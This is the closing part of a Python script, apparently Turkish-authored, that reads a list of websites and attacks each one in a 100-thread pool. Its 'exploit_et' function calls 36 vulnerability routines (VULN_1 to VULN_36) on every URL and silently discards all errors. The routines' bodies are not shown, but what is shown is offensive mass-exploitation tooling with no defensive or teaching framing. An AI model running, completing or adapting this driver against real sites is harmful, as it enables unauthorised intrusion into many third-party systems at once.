    except Exception as e:
        pass
def exploit_et(url):
    url = http_ekle(url)
    try:
        VULN_1(url)
        VULN_2(url)
        VULN_3(url)
        VULN_4(url)
        VULN_5(url)
        VULN_6(url)
        VULN_7(url)
        VULN_8(url)
        VULN_9(url)
        VULN_10(url)
        VULN_11(url)
        VULN_12(url)
        VULN_13(url)
        VULN_14(url)
        VULN_15(url)
        VULN_16(url)
        VULN_17(url)
        VULN_18(url)
        VULN_19(url)
        VULN_20(url)
        VULN_21(url)
        VULN_22(url)
        VULN_23(url)
        VULN_24(url)
        VULN_25(url)
        VULN_26(url)
        VULN_27(url)
        VULN_28(url)
        VULN_29(url)
        VULN_30(url)
        VULN_31(url)
        VULN_32(url)
        VULN_33(url)
        VULN_34(url)
        VULN_35(url)
        VULN_36(url)
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def anasayfa():
    banner()
    websites = site_listesi_oku()
    try:
        Poolx = multiprocessing.dummy.Pool(100)
        Poolx.map(exploit_et,websites)
        Poolx.close()
        Poolx.join()
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
anasayfa()